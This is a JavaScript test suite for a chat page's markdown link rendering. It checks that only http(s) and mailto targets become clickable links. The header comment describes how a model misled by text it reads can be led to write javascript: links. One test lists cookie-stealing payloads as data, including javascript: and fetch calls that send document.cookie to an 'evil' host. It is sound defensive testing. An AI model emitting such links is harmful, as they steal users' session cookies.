/* A link the agent writes can only navigate.
 *
 * A model can be led by text it reads -- a web page, a file -- into writing
 * [text](javascript:...), and a link like that runs script in this page when
 * clicked.  Only http(s) and mailto targets become links; anything else is
 * shown as the text it was.  Driven through Chat.handleMessage, as the page
 * renders an assistant message.
 */

const { rendered, suite } = require('./md_harness');

const { test, assert, done } = suite('markdown links');

test('a web link is a link, opening in a new tab', () => {
  const a = rendered('see [the docs](https://example.com/a?b=1&c=2)').querySelector('a');
  assert(a, 'no link');
  assert(a.getAttribute('href') === 'https://example.com/a?b=1&c=2', a.getAttribute('href'));
  assert(a.textContent === 'the docs' && a.target === '_blank'
         && a.rel === 'noopener', a.outerHTML);
  assert(rendered('[x](http://example.com)').querySelector('a'), 'plain http');
  assert(rendered('[x](HTTPS://EXAMPLE.COM)').querySelector('a'), 'scheme in capitals');
});

test('a target with parentheses in it is whole', () => {
  const a = rendered('[Rust](https://en.wikipedia.org/wiki/Rust_(programming_language)) is')
    .querySelector('a');
  assert(a && a.getAttribute('href') === 'https://en.wikipedia.org/wiki/Rust_(programming_language)',
         a ? a.getAttribute('href') : 'no link');
});

test('so is an address', () => {
  assert(rendered('[mail me](mailto:a@example.com)').querySelector('a'), 'no mailto link');
});

test('a script link is not a link: its text, the target in a tooltip', () => {
  for (const href of ["javascript:location='//evil/'+document.cookie",
                      "javascript:fetch('https://evil/'+document.cookie)",
                      'JavaScript:alert(1)',
                      ' javascript:alert(1)',
                      'data:text/html,<script>alert(1)</script>',
                      'vbscript:msgbox(1)']) {
    const el = rendered(`see [docs](${href})`);
    assert(!el.querySelector('a'), `${href}: became a link`);
    assert(!el.querySelector('script'), `${href}: made a script element`);
    const inert = el.querySelector('.md-link-inert');
    assert(inert && inert.textContent === 'docs', `${href}: the text was lost`);
    assert(inert.getAttribute('title') === href, `${href}: tooltip ${inert.getAttribute('title')}`);
  }
});

test('nor is a target without a scheme', () => {
  // A path resolves against this page's own server, where nothing is.
  const el = rendered('[main.rs](src/main.rs)');
  assert(!el.querySelector('a'), 'a relative path became a link');
  assert(el.querySelector('.md-link-inert').textContent === 'main.rs', 'the text was lost');
});

test('a target is kept as written, whatever markdown is in it', () => {
  // Code spans and emphasis used to be rendered first, into the target --
  // and a quote of the markup ended the attribute, spilling the rest.
  for (const href of ['https://x.com/`p`', 'https://a.com/*b*/c', 'https://a.com/**b**']) {
    const a = rendered(`see [docs](${href}) now`).querySelector('a');
    assert(a, `${href}: no link`);
    assert(a.getAttribute('href') === href, `${href}: href ${a.getAttribute('href')}`);
    assert(a.textContent === 'docs' && a.target === '_blank' && a.rel === 'noopener',
           `${href}: ${a.outerHTML}`);
  }
});

test('its text may have emphasis and code in it', () => {
  const a = rendered('[**the** `docs`](https://x.com)').querySelector('a');
  assert(a && a.querySelector('strong') && a.querySelector('code.md-code'),
         a ? a.innerHTML : 'no link');
});

test('a link written in a code span is shown as written', () => {
  const el = rendered('write `[docs](https://x.com)` for a link');
  assert(!el.querySelector('a'), 'the code span became a link');
  assert(el.querySelector('code.md-code').textContent === '[docs](https://x.com)',
         el.innerHTML);
});

done();
